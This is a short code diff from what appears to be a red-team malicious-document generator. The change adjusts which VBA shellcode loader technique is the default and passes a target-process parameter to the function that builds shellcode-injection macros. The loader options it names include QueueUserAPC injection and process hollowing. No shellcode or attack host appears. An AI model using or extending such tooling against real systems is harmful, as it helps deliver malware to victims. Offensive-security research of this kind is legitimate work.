@@ -2006,13 +2006,17 @@ generated if none have been entered.""",
 
                         # Map loader selection to plugin parameter
                         loader_map = {
-                            "VirtualAlloc + CreateThread": "virtualalloc",
+                            "VirtualAlloc + CreateThread": "createthread",
                             "EnumSystemLocalesA Callback": "enumlocales",
                             "QueueUserAPC Injection": "queueuserapc",
                             "Process Hollowing": "hollowing"
                         }
-                        loader_type = loader_map.get(self.get_parameter("7.7 VBA Loader Technique"), "virtualalloc")
+                        loader_type = loader_map.get(self.get_parameter("7.7 VBA Loader Technique"), "createthread")
                         output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"
+
+                        # Get target process for hollowing technique
+                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
+                        output += f"[DEBUG] Target process: {target_process}\n"
 
                         # Generate VBA that injects the shellcode
                         from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
@@ -2020,7 +2024,8 @@ generated if none have been entered.""",
                         vba_code = plugin.generate_shellcode_injection_vba(
                             vba_shellcode=shellcode_vba,
                             trigger_type=vba_trigger,
-                            loader_type=loader_type
+                            loader_type=loader_type,
+                            target_process=target_process
                         )
                     
                     if obfuscate:
